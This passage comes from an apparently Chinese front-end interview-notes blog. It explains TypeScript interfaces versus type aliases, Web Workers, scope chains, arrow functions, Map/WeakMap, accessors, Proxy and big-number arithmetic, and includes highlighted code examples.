<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Point</span> = &#123; <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span> &#125;;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Color</span> = &#123; <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span> &#125;;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ColoredPoint</span> = <span class="hljs-title class_">Point</span> &amp; <span class="hljs-title class_">Color</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li>类型别名也可以使用联合类型。</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Success</span> | <span class="hljs-title class_">Error</span>;<br></code></pre></td></tr></table></figure></li>
</ul>
<h5 id="3-区别："><a href="#3-区别：" class="headerlink" title="3. 区别："></a>3. 区别：</h5><ul>
<li><p><strong>可重复声明</strong>：</p>
<ul>
<li>接口可以被多次声明，会自动合并相同名称的接口。而类型别名不能重复声明。</li>
</ul>
</li>
<li><p><strong>可拓展性</strong>：</p>
<ul>
<li>类型别名具有更丰富的类型操作符，如联合类型（<code>|</code>）、交叉类型（<code>&amp;</code>）等，更适合复杂类型定义。</li>
<li>接口可以使用 <code>extends</code> 来扩展其他接口，但无法进行类型操作。</li>
</ul>
</li>
<li><p><strong>适用场景</strong>：</p>
<ul>
<li>如果你需要定义一个新的自定义类型，通常使用接口更为直观。</li>
<li>如果你需要处理复杂类型，如联合类型或交叉类型，或者需要为函数签名定义类型别名，那么类型别名更为适合。</li>
</ul>
</li>
</ul>
<p>总的来说，<code>interface</code> 主要用于定义对象的形状和类的结构，而 <code>type</code> 别名更适合用于创建复杂类型、联合类型、交叉类型以及函数签名类型的别名。在实际应用中，你可以根据具体需求选择使用哪种方式，它们在 TypeScript 中可以互补使用。</p>
<p>这是一个微妙的话题，不要太纠结。这是一个方便的表格：</p>
<table>
<thead>
<tr>
<th>方面</th>
<th>Type</th>
<th>Interface</th>
</tr>
</thead>
<tbody><tr>
<td>可以描述功能</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>可以描述构造函数</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>可以描述元组</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>接口可以扩展它</td>
<td>⚠️</td>
<td>✅</td>
</tr>
<tr>
<td>类可以扩展它</td>
<td>🚫</td>
<td>✅</td>
</tr>
<tr>
<td>类可以实现它（<code>implements</code>）</td>
<td>⚠️</td>
<td>✅</td>
</tr>
<tr>
<td>可以与另一同类相交</td>
<td>✅</td>
<td>⚠️</td>
</tr>
<tr>
<td>可以与另一个同类建立联盟</td>
<td>✅</td>
<td>🚫</td>
</tr>
<tr>
<td>可用于创建映射类型</td>
<td>✅</td>
<td>🚫</td>
</tr>
<tr>
<td>可以使用映射类型进行映射</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>在错误消息和日志中扩展</td>
<td>✅</td>
<td>🚫</td>
</tr>
<tr>
<td>可以增强</td>
<td>🚫</td>
<td>✅</td>
</tr>
<tr>
<td>可以递归</td>
<td>⚠️</td>
<td>✅</td>
</tr>
</tbody></table>
<ol>
<li>定义基本类型别名</li>
</ol>
<p><code>type</code>可以定义<strong>基本类型别名</strong>, 但是<code>interface</code>无法定义,如：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini">type <span class="hljs-attr">userName</span> = string<br>type <span class="hljs-attr">stuNo</span> = number<br>...<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>声明联合类型</li>
</ol>
<p><code>type</code>可以声明<strong>联合类型</strong>, 例如：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">type <span class="hljs-attr">Student</span> = &#123;stu<span class="hljs-literal">No</span>: number&#125; | &#123;classId: number&#125;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>声明元组</li>
</ol>
<p>type可以声明 <strong>元组类型</strong>：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">type <span class="hljs-attr">Data</span> = [number, string]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>以上都是 <code>type</code>能做到， 而<code>interface</code>做不到的， 接下来聊聊<code>type</code>做不到的</p>
<ol start="4">
<li>声明合并</li>
</ol>
<p>如果你多次声明一个同名的接口，TypeScript 会将它们合并到一个声明中，并将它们视为一个接口。这称为<strong>声明合并</strong>， 例如：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> &#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> &#125;<br><br><span class="hljs-keyword">let</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">Person</span> = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Tolu&quot;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>这种情况下，如果是<code>type</code>的话，重复使用<code>Person</code>是会报错的：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> &#123; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> &#125;; <br><br><span class="hljs-comment">// Error: 标识符“Person”重复。ts(2300)</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> &#123; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> &#125;<br></code></pre></td></tr></table></figure>

<ol start="5">
<li>索引签名问题</li>
</ol>
<p>如果你经常使用TypeScript, 一定遇到过相似的错误：</p>
<blockquote>
<p>Type ‘xxx’ is not assignable to type ‘yyy’</p>
<p>Index signature is missing in type ‘xxx’.</p>
</blockquote>
<p>看个例子来理解问题：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ini">interface propType&#123;<br>    <span class="hljs-section">[key: string]</span> : string<br>&#125;<br><br>let props: propType<br><br>type <span class="hljs-attr">dataType</span> = &#123;<br>    title: string<br>&#125;<br>interface dataType1 &#123;<br>    title: string<br>&#125;<br>const data: <span class="hljs-attr">dataType</span> = &#123;title: <span class="hljs-string">&quot;订单页面&quot;</span>&#125;<br>const data1: <span class="hljs-attr">dataType1</span> = &#123;title: <span class="hljs-string">&quot;订单页面&quot;</span>&#125;<br><span class="hljs-attr">props</span> = data<br>// Error:类型“dataType1”不可分配给类型“propType”<span class="hljs-comment">; 类型“dataType1”中缺少索引签名 </span><br><span class="hljs-attr">props</span> = data1<br></code></pre></td></tr></table></figure>

<p>我们发现<code>dataType</code>和<code>dataType1</code>对应的类型一样，但是<code>interface</code>定义的就赋值失败，是什么原因呢？刚开始百思不解，最后我在 stack overflow上找到了一个相似的问题：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/465347e9c2254ea1a103ffbf796e3c5d~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" srcset="/blog/img/loading.gif" lazyload alt="图片"></p>
<p>并且很幸运的找到了有效的答案：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/56495f49fe98479fa0392a5d8bd19518~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" srcset="/blog/img/loading.gif" lazyload alt="图片"></p>
<p>翻译过来的大致意思就是：</p>
<blockquote>
<p><code>Record&lt;string,string&gt;</code>与<code>&#123;[key:string]：string&#125;</code>相同。只有当该类型的所有属性都已知并且可以对照该索引签名进行检查时，才允许将子集分配给该索引签名类型。在您的例子中，从<code>exampleType</code>到<code>Record&lt;string,string&gt;</code>的所有内容都是可分配的。这只能针对对象字面量类型进行检查，因为一旦声明了对象字面量类型，就无法更改它们。因此，索引签名是已知的。</p>
<p>相反，<strong>在你使用interface去声明变量时，它们在那一刻类型并不是最终的类型</strong>。由于interfac可以进行<strong>声明合并</strong>，所以总有可能将新成员添加到同一个interface定义的类型上。</p>
</blockquote>
<p>再结合👆<code>第4点 声明合并</code>的讲解, 这样就很好理解了。就是说<code>interface</code>定义的类型是不确定的， 后面再来一个：</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">propType</span>&#123;<br>    title:number<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这样<code>propType</code>类型就被改变了。</p>
<h3 id="35、谈谈你对Web-Workers的理解"><a href="#35、谈谈你对Web-Workers的理解" class="headerlink" title="35、谈谈你对Web Workers的理解"></a>35、谈谈你对Web Workers的理解</h3><p>Web Workers 在浏览器中提供了一个单独的、并行的执行环境，可以运行长时间运行的脚本而不会阻塞 UI 线程。然而，这个执行环境与主 JavaScript 执行环境相比有一些限制。以下是主要的一些限制：</p>
<ol>
<li>无法访问 DOM：Web Workers 运行在隔离的线程中，不能直接访问网页的 DOM。任何与 UI 相关的操作都需要通过主线程完成。</li>
<li>无法访问全局对象：Web Workers 不能访问许多全局对象，如 <code>window</code> 对象，因为这些对象与 UI 相关或者包含与 UI 相关的功能。</li>
<li>无法访问某些 Web API：像 navigator.geolocation 或者 window.localStorage 这样的 Web API 无法在 Web Workers 中使用。</li>
<li>无法加载其他脚本：Web Workers 无法使用 <code>&lt;script&gt;</code> 标签加载其他脚本。但是，可以使用 <code>importScripts()</code> 函数来导入其他脚本。</li>
<li>数据传递限制：Web Workers 通过消息传递与主线程通信。这意味着所有的数据在传送时都需要被序列化和反序列化，这可能会对性能产生影响。</li>
<li>运行环境的限制：Web Workers 运行在不同的全局上下文中，即 <code>DedicatedWorkerGlobalScope</code>，而不是主线程的 <code>window</code>。因此，一些预期在 <code>window</code> 上下文中使用的代码在 Web Worker 中可能无法正常工作。</li>
</ol>
<p>总的来说，Web Workers 是设计用于执行计算密集型或者长时间运行的任务，而非操作 UI 或者处理与 UI 相关的逻辑。对于需要与 UI 交互的操作，仍然需要在主线程中完成。</p>
<h3 id="36、如何理解作用域、作用域链和执行上下文？"><a href="#36、如何理解作用域、作用域链和执行上下文？" class="headerlink" title="36、如何理解作用域、作用域链和执行上下文？"></a>36、如何理解作用域、作用域链和执行上下文？</h3><p>在JavaScript中，作用域、作用域链和执行上下文是密切相关的概念，它们与变量和函数的查找、访问以及生命周期有关。</p>
<ol>
<li><p>作用域（Scope）：</p>
<p><strong>作用域是一个变量或函数的可访问范围</strong>。JavaScript中有三种作用域：<strong>全局作用域</strong>、<strong>局部（函数）作用域</strong>和<strong>块级作用域</strong>。全局作用域中声明的变量和函数可以在整个代码中访问，局部作用域中声明的变量和函数只能在特定的函数内部访问，块级作用域在一对花括号内定义，对<code>let</code>和<code>const</code>关键字声明的变量有效。</p>
<p>变量的生命周期受其作用域的限制。全局作用域中的变量在整个程序执行过程中持续存在，局部作用域中的变量在函数执行结束时销毁，块级作用域在代码块执行结束时，块级作用域中的变量将被销毁。</p>
</li>
<li><p>作用域链（Scope Chain）：</p>
<p><strong>当代码执行过程中访问一个变量或函数时，JavaScript引擎会沿着作用域链查找该标识符</strong>。作用域链是由当前执行上下文的作用域和其所有父级作用域组成的链表。</p>
<p>查找过程从当前作用域开始，然后逐级向上查找，直到找到目标标识符或到达全局作用域。如果在全局作用域中仍未找到目标标识符，则返回<code>undefined</code>。</p>
</li>
<li><p>执行上下文（Execution Context）：</p>
<p><strong>执行上下文是JavaScript代码执行过程中的环境</strong>。每当进入一个新的函数执行或全局代码执行时，都会创建一个新的执行上下文。执行上下文包含了当前执行的代码所需的所有信息，如变量、函数、作用域链等。</p>
<p>JavaScript引擎使用执行上下文栈（Execution Context Stack）来管理执行上下文。栈顶的执行上下文为当前执行的代码环境。当一个函数被调用时，一个新的执行上下文被压入栈顶；当函数执行结束时，执行上下文从栈顶弹出，返回到调用者的上下文环境。</p>
</li>
</ol>
<p>总结起来，作用域是变量和函数的可访问范围；作用域链是由当前执行上下文的作用域和其父级作用域组成的链表，用于在代码执行过程中查找变量和函数；执行上下文是代码执行过程中的环境，包含了当前执行的代码所需的所有信息。这三者共同决定了代码执行过程中变量和函数的查找、访问以及生命周期。</p>
<h3 id="37、箭头函数与普通函数区别？"><a href="#37、箭头函数与普通函数区别？" class="headerlink" title="37、箭头函数与普通函数区别？"></a>37、箭头函数与普通函数区别？</h3><p>箭头函数（Arrow Functions）与普通函数（常被称为函数声明或函数表达式）在 JavaScript 中有一些重要的区别。这些区别包括语法、<code>this</code> 关键字的绑定、arguments 对象的使用、构造函数行为以及原型链。以下是箭头函数和普通函数之间的主要区别：</p>
<ol>
<li><p>this</p>
<p>关键字绑定：</p>
<ul>
<li>箭头函数没有自己的 <code>this</code>，它从包围它的普通函数或全局作用域继承 <code>this</code>。这使得在事件处理器或回调函数中使用箭头函数非常方便，因为它们自动捕获外部的 <code>this</code>。</li>
<li>普通函数有自己的 <code>this</code>，它的值在函数调用时确定。根据函数调用的方式（如通过对象方法调用、直接调用、构造函数调用等），<code>this</code> 的值可能会有所不同。</li>
</ul>
</li>
<li><p>arguments 对象：</p>
<ul>
<li>箭头函数没有自己的 <code>arguments</code> 对象。它们可以访问包围它们的普通函数的 <code>arguments</code> 对象。</li>
<li>普通函数有自己的 <code>arguments</code> 对象，这是一个类数组对象，包含了传递给函数的参数。</li>
</ul>
</li>
<li><p>构造函数行为：</p>
<ul>
<li>箭头函数不能作为构造函数使用，因此不能使用 <code>new</code> 关键字调用。它们也没有 <code>prototype</code> 属性。</li>
<li>普通函数可以作为构造函数使用，通过 <code>new</code> 关键字创建新的对象实例。</li>
</ul>
</li>
<li><p>原型链：</p>
<ul>
<li>由于箭头函数没有 <code>prototype</code> 属性，它们不能作为其他对象的原型。</li>
<li>普通函数有 <code>prototype</code> 属性，可以作为其他对象的原型。</li>
</ul>
</li>
<li><p>生成器：</p>
<ul>
<li>箭头函数不能使用<code>yield</code>关键字。</li>
<li>普通函数可以使用<code>yield</code>关键字变成生成器函数。</li>
</ul>
</li>
</ol>
<h3 id="38、Map和WeekMap"><a href="#38、Map和WeekMap" class="headerlink" title="38、Map和WeekMap"></a>38、Map和WeekMap</h3><p><code>Map</code> 和 <code>WeakMap</code> 都是 JavaScript 中用于存储键值对的数据结构，它们之间有一些重要的区别，主要体现在键的强引用和垃圾回收方面：</p>
<ol>
<li><p><strong>Map（强引用映射）：</strong></p>
<ul>
<li><code>Map</code> 是一个通用的键值对集合，可以使用各种数据类型作为键（包括对象、字符串、数字等）。</li>
<li><code>Map</code> 中的键是强引用的，这意味着只要存在对键的引用，键不会被垃圾回收。这可以确保在 <code>Map</code> 中存储的数据不会被不必要地销毁。</li>
<li><code>Map</code> 是可迭代的，可以使用 <code>for...of</code> 循环遍历其中的键值对。</li>
<li><code>Map</code> 具有各种方法，用于添加、获取、删除和检查键值对，例如 <code>set(key, value)</code>、<code>get(key)</code>、<code>delete(key)</code>、<code>has(key)</code> 等。</li>
</ul>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> myMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><span class="hljs-keyword">const</span> key = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span> &#125;;<br>myMap.<span class="hljs-title function_">set</span>(key, <span class="hljs-string">&#x27;some value&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myMap.<span class="hljs-title function_">get</span>(key)); <span class="hljs-comment">// &#x27;some value&#x27;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><p><strong>WeakMap（弱引用映射）：</strong></p>
<ul>
<li><code>WeakMap</code> 也是一个键值对集合，但它的键是弱引用的，这意味着当没有对键的强引用时，键会被垃圾回收，这可以防止内存泄漏。</li>
<li><code>WeakMap</code> 的键必须是对象，不能是原始数据类型（如字符串、数字等）。</li>
<li><code>WeakMap</code> 不具备迭代能力，因此无法像 <code>Map</code> 那样直接遍历所有键值对。</li>
<li><code>WeakMap</code> 拥有的方法有限，主要包括 <code>set(key, value)</code>、<code>get(key)</code>、<code>delete(key)</code> 和 <code>has(key)</code>。</li>
</ul>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> myWeakMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><span class="hljs-keyword">const</span> key = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span> &#125;;<br>myWeakMap.<span class="hljs-title function_">set</span>(key, <span class="hljs-string">&#x27;some value&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myWeakMap.<span class="hljs-title function_">get</span>(key)); <span class="hljs-comment">// &#x27;some value&#x27;</span><br></code></pre></td></tr></table></figure>

<p>要选择使用 <code>Map</code> 还是 <code>WeakMap</code> 取决于你的需求。如果需要强引用的键，或者需要能够迭代和访问所有键值对，那么使用 <code>Map</code> 是合适的。如果你希望键是弱引用的，以避免内存泄漏，那么可以考虑使用 <code>WeakMap</code>。一般来说，<code>WeakMap</code> 主要用于实现私有属性或缓存等场景，而 <code>Map</code> 则更常用于通用的键值对存储。</p>
<h3 id="39、对象属性的get和set是什么"><a href="#39、对象属性的get和set是什么" class="headerlink" title="39、对象属性的get和set是什么"></a>39、对象属性的get和set是什么</h3><p>在 JavaScript 中，对象属性的 <code>get</code> 和 <code>set</code> 是用于定义和访问属性的特殊方法，它们允许你在获取和设置属性值时执行自定义的逻辑。这是 ECMAScript 5 引入的特性，被称为 “属性访问器” 或 “存取器”。它们通常用于控制属性的读取和写入行为，以便在读取或设置属性值时执行一些额外的操作。</p>
<ol>
<li><p><strong><code>get</code> 方法：</strong> 用于定义属性的获取行为。当你尝试访问属性值时，<code>get</code> 方法会被调用，允许你返回一个自定义的值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> obj = &#123;<br>  <span class="hljs-attr">_value</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Getting value&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">value</span>); <span class="hljs-comment">// 调用 get 方法，输出 &quot;Getting value&quot;，然后返回 0</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong><code>set</code> 方法：</strong> 用于定义属性的设置行为。当你尝试设置属性值时，<code>set</code> 方法会被调用，允许你执行一些额外的逻辑，例如验证输入值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> obj = &#123;<br>  <span class="hljs-attr">_value</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newValue</span>) &#123;<br>    <span class="hljs-keyword">if</span> (newValue &gt;= <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Setting value to&quot;</span>, newValue);<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = newValue;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Invalid value&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-property">value</span> = <span class="hljs-number">42</span>; <span class="hljs-comment">// 调用 set 方法，设置 _value 为 42</span><br>obj.<span class="hljs-property">value</span> = -<span class="hljs-number">5</span>; <span class="hljs-comment">// 调用 set 方法，但输出 &quot;Invalid value&quot;，不设置 _value</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>上述示例中的 <code>_value</code> 属性是一个内部属性，而 <code>value</code> 属性是一个存取器属性，它通过 <code>get</code> 和 <code>set</code> 方法来控制对 <code>_value</code> 的访问和修改。</p>
<p>使用 <code>get</code> 和 <code>set</code> 方法可以在对象属性上添加更多的逻辑和控制，以满足特定需求，例如数据验证、计算属性等。这种技术在类和对象的封装中也很有用。请注意，存取器属性的名称通常以一个下划线 <code>_</code> 开头，以表示它是一个内部属性，而不是直接访问的属性。</p>
<h3 id="40、proxy的使用"><a href="#40、proxy的使用" class="headerlink" title="40、proxy的使用"></a>40、proxy的使用</h3><p>在 JavaScript 中，<code>Proxy</code> 是一个构造函数，用于创建代理对象，以拦截并自定义目标对象的操作。<code>Proxy</code> 构造函数接受两个参数：</p>
<ol>
<li><p><strong>目标对象（Target）：</strong> 这是你希望创建代理的对象，代理对象会封装目标对象并拦截其操作。目标对象可以是任何普通 JavaScript 对象，包括数组、函数、自定义对象等。</p>
</li>
<li><p><strong>处理程序对象（Handler）：</strong> 处理程序对象是一个包含捕获器方法的对象，用于定义代理对象的行为。捕获器方法是一组特殊的函数，它们会在代理对象的操作上被调用，允许你自定义代理对象的行为。</p>
</li>
</ol>
<p>下面是一个示例，演示了如何使用 <code>Proxy</code> 构造函数创建一个简单的代理对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> target = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>&#125;;<br><br><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Getting property &quot;<span class="hljs-subst">$&#123;prop&#125;</span>&quot;`</span>);<br>    <span class="hljs-keyword">return</span> target[prop];<br>  &#125;,<br>  <span class="hljs-attr">set</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">target, prop, value</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Setting property &quot;<span class="hljs-subst">$&#123;prop&#125;</span>&quot; to &quot;<span class="hljs-subst">$&#123;value&#125;</span>&quot;`</span>);<br>    target[prop] = value;<br>  &#125;,<br>&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxy.<span class="hljs-property">name</span>); <span class="hljs-comment">// 会触发捕获器方法 get，输出 &quot;Getting property &quot;name&quot;&quot;</span><br>proxy.<span class="hljs-property">age</span> = <span class="hljs-number">35</span>;          <span class="hljs-comment">// 会触发捕获器方法 set，输出 &quot;Setting property &quot;age&quot; to &quot;35&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<p>在上述示例中，<code>target</code> 是目标对象，<code>handler</code> 是处理程序对象，我们使用 <code>Proxy</code> 构造函数将它们传递给 <code>new Proxy</code>，从而创建了一个代理对象 <code>proxy</code>。代理对象拦截了对目标对象的访问和修改操作，并在捕获器方法中自定义了行为。</p>
<p>根据需要，你可以在 <code>handler</code> 对象中定义不同的捕获器方法，例如 <code>get</code>、<code>set</code>、<code>apply</code>、<code>construct</code> 等，来拦截不同类型的操作。这些捕获器方法接受一些参数，以便你在其中编写自定义的逻辑来处理代理对象的行为。</p>
<h3 id="41、Number多少位？如何解决大数据除了bigint？"><a href="#41、Number多少位？如何解决大数据除了bigint？" class="headerlink" title="41、Number多少位？如何解决大数据除了bigint？"></a>41、Number多少位？如何解决大数据除了bigint？</h3><p>在JavaScript中，<code>Number</code>类型用于表示数字。JavaScript中的<code>Number</code>类型遵循IEEE 754浮点数标准，通常使用64位双精度浮点数表示，即占用64位或8字节的内存。这意味着JavaScript中的<code>Number</code>可以表示的整数范围是有限的，最大安全整数（safe integer）是2^53 - 1，即9007199254740991。任何超出这个范围的整数都可能会丢失精度。</p>
<p>对于大整数，除了使用JavaScript的<code>BigInt</code>类型外，还可以考虑以下解决方法：</p>
<ol>
<li><p><strong>使用字符串表示：</strong> 对于非常大的整数，您可以将其表示为字符串，然后使用字符串操作来执行数字运算。这不会丢失精度，但需要额外的计算。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> bigNumberStr1 = <span class="hljs-string">&#x27;1234567890123456789012345678901234567890&#x27;</span>;<br><span class="hljs-keyword">const</span> bigNumberStr2 = <span class="hljs-string">&#x27;9876543210987654321098765432109876543210&#x27;</span>;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">addBigIntStrings</span>(bigNumberStr1, bigNumberStr2);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addBigIntStrings</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-keyword">let</span> carry = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">let</span> maxLength = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(a.<span class="hljs-property">length</span>, b.<span class="hljs-property">length</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; maxLength; i++) &#123;<br>        <span class="hljs-keyword">const</span> digitA = <span class="hljs-built_in">parseInt</span>(a[a.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i] || <span class="hljs-string">&#x27;0&#x27;</span>);<br>        <span class="hljs-keyword">const</span> digitB = <span class="hljs-built_in">parseInt</span>(b[b.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i] || <span class="hljs-string">&#x27;0&#x27;</span>);<br>        <span class="hljs-keyword">const</span> sum = digitA + digitB + carry;<br>        carry = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(sum / <span class="hljs-number">10</span>);<br>        result = (sum % <span class="hljs-number">10</span>) + result;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (carry &gt; <span 